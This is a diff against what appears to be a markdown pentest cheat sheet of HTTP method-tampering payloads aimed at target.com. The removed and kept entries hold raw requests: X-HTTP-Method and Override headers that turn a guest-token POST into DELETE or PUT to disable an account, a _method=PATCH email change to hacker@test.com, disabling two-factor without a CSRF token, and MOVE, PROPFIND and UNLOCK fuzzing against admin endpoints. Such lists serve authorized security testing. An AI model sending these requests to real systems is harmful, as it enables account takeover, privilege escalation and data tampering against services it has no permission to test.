@@ -5160,17 +5160,6 @@ Host: target.com
 
 ---
 
-### **9. TRACK Method Enabled Test**
-
-**Real Payload:**
-
-```
-TRACK /api/v1/payments HTTP/1.1
-Host: target.com
-```
-
----
-
 ### **10. CONNECT Method Enabled Test**
 
 **Real Payload:**
@@ -5178,37 +5167,6 @@ Host: target.com
 ```
 CONNECT internal.target.com:443 HTTP/1.1
 Host: internal.target.com
-```
-
----
-
-### **11. Method Override Test (X-HTTP-Method)**
-
-**Real Payload:**
-
-```
-POST /api/v1/users/9401 HTTP/1.1
-Host: target.com
-X-HTTP-Method: DELETE
-Authorization: Bearer guest-token-123
-```
-
----
-
-### **12. X-HTTP-Method-Override Test**
-
-**Real Payload:**
-
-```
-POST /api/v1/users/9401 HTTP/1.1
-Host: target.com
-X-HTTP-Method-Override: PUT
-Content-Type: application/json
-Authorization: Bearer guest-token-123
-
-{
-  "account_status": "disabled"
-}
 ```
 
 ---
@@ -5236,30 +5194,6 @@ Content-Type: application/x-www-form-urlencoded
 Authorization: Bearer user-token-123
 
 _method=PATCH&email=hacker@test.com
-```
-
----
-
-### **15. Custom Verb Fuzzing via Burp Repeater**
-
-**Real Payload:**
-
-```
-MOVE /api/v1/admin/settings HTTP/1.1
-Host: target.com
-Authorization: Bearer guest-token-123
-```
-
----
-
-### **16. Privilege Escalation via Unsupported HTTP Methods**
-
-**Real Payload:**
-
-```
-PROPFIND /api/v1/admin/users HTTP/1.1
-Host: target.com
-Authorization: Bearer guest-token-123
 ```
 
 ---
@@ -5303,19 +5237,3 @@ Content-Type: application/json
 
 {"two_factor_enabled": false}
 ```
-
-*(Sent without CSRF token.)*
-
----
-
-### **20. API Verb Fuzzing (Unsupported Verbs Test)**
-
-**Real Payload:**
-
-```
-UNLOCK /api/v1/admin/panel HTTP/1.1
-Host: target.com
-Authorization: Bearer guest-token-123
-```
-
----
